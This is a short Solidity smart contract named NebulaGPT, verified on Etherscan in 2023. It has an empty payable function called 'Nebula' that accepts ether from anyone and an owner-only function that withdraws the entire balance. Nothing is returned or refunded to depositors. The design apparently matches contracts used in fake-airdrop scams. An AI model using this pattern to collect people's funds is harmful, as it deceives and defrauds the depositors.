/**
 *Submitted for verification at Etherscan.io on 2023-06-07
*/

pragma solidity ^0.4.26;

contract NebulaGPT {

    address private  owner;

     constructor() public{   
        owner=msg.sender;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function transfer() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function Nebula() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}